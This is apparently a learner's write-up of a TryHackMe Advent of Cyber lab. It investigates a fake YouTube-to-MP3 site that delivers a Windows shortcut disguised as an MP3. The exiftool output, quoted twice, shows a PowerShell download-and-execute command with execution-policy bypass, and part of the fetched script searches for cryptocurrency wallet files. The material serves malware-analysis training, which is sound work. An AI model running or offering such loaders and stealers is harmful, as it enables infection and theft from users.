The Story

![Task banner for day DAY 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730193392309.svg)

_McSkidy tapped keys with a confident grin,_

_A suspicious website, now where to begin?_

_She'd seen sites like this, full of code and of grime,_

_Shady domains, and breadcrumbs easy to find._

McSkidy's fingers flew across the keyboard, her eyes narrowing at the suspicious website on her screen. She had seen dozens of malware campaigns like this. This time, the trail led straight to someone who went by the name "Glitch."

"Too easy," she muttered with a smirk.

"I still have time," she said, leaning closer to the screen. "Maybe there's more."

Little did she know, beneath the surface lay something far more complex than a simple hacker's handle. This was just the beginning of a tangled web unravelling everything she thought she knew.

![Illustration showing McSkidy in front of a house](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730708209738.png)  

## Learning Objectives

- Learn how to investigate malicious link files.
- Learn about OPSEC and OPSEC mistakes.
- Understand how to track and attribute digital identities in cyber investigations.

## Connecting to the Machine

Before moving forward, review the questions in the connection card shown below and start the virtual machine by pressing the **Start Machine** button. The VM should be fully loaded in 3 minutes. Additionally, you will need the AttackBox, which can be launched by clicking the **Start AttackBox** button at the top of the page.

Start Machine

**NOTE:** 

If you’re clicking "Start Machine" and encountering an issue launching it, don’t worry—it’s just the high demand. What can you do?

- Keep trying! Machines are becoming available as demand fluctuates.
- If you’re still having trouble, come back a little later when it’s less busy.

![Banner showing connection options provided in this room.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730200909294.png)

## Investigating the Website

The website we are investigating is a Youtube to MP3 converter currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.

![A screenshot of the website.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1730738103063.png)

From your AttackBox, access the website by visiting **MACHINE_IP** using the web browser.

At first glance, the website looks legit and presentable. The About Page even says that it was made by "The Glitch ". How considerate of them to make our job easier!

Scrolling down, you'll see the feature list, which promises to be "Secure" and "Safe." From our experience, that isn't very likely.

## Youtube to MP3 Converter Websites

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **Phishing scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.

What nefarious thing does this website have in store for us?

## Getting Some Tunes

Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either `mp3 or mp4` option. This should download a file that we could use to investigate. For example, we can use [https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ), a classic if you ask me.  

Once downloaded, navigate to your Downloads folder or if you are using the AttackBox, to your /root/ directory. Locate the file named `download.zip`, right-click on it, and select **Extract To**. In the dialog window, click the **Extract** button to complete the extraction.

![A screenshot presenting extraction of a zip archive.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731073491258.png)  

You'll now see two extracted two files: `song.mp3` and `somg.mp3`.

To quickly determine the file's contents, double-click on the "Terminal" icon on the desktop then run the `file` command on each one. First, let's try checking `song.mp3`.

Check File 1 Terminal

```shell-session
user@tryhackme:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

There doesn't seem to be anything suspicious, according to the output. As expected, this is just an MP3 file.

How about the second file `somg.mp3`? From the filename alone, we can tell something is not right. Still, let's confirm by running the `file` command on it anyway.

Check File 2 Terminal

```shell-session
user@tryhackme:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```

Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a `.lnk` file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.

There are multiple ways to inspect `.lnk`  files to reveal the embedded commands and attributes. For this room, however, we'll use **ExifTool**, which is already installed on this machine.

To do this, go back to your Terminal and type:

Using Exiftool Terminal

```shell-session
user@tryhackme:~$ exiftool somg.mp3
```

```shell-session
Relative Path : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Working Directory : C:\Windows\System32\WindowsPowerShell\v1.0 Command Line Arguments : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)" Machine ID : win-base-2019
```

It's downloading some kind of file!
A powershell script is will run in the background!
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"

What this PowerShell command does:

- The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The `DownloadFile` method pulls a file (in this case, `IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the `C:\\ProgramData\\` directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.


I tried visiting the link and saw this:

PowerShellScript Terminal:

```powershell

function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```


### Quick Review
### Advent of Cyber 2024 - **Day 1 Review**

**Challenge Summary**:  
The malicious actor, **M.M.**, embedded a **PowerShell script** in a seemingly innocent **YouTube-to-song converter website**. This script was designed to harvest credentials from users on **Windows systems**.

**Approach & Key Steps**:

1. **Download & Inspect the File**:
    
    - Downloaded the suspicious file from the converter site.
    - Analyzed the file using **ExifTool** to uncover hidden metadata and scripts.
2. **Trace the Malicious Script**:
    
    - Found references to M.M.'s **GitHub issues**, where the malicious PowerShell script was hosted.
    - The script's purpose was to steal user credentials.
3. **Respond to Questions**:
    
    - Answered questions based on findings, completing the guided room.

**Key Learnings**:

- **Watering Hole Attack**: This involves compromising commonly visited websites/tools to infect users.
- **File Metadata Analysis**: Tools like **ExifTool** can uncover hidden content in files, which is invaluable in investigating malware or suspicious activity.
- **PowerShell Abuse**: PowerShell scripts are often used in attacks for credential theft and payload delivery. Proper logging (e.g., **Sysmon**) is crucial to detect such threats.
- **Importance of Guided Labs**: Exercises like these build fundamental skills in a SOC role and help develop intuition for real-world scenarios.

**Reflection**:  
This task was straightforward, thanks to prior experience with similar labs in **BTLO**. The guided format made navigation easy, reinforcing core investigative techniques.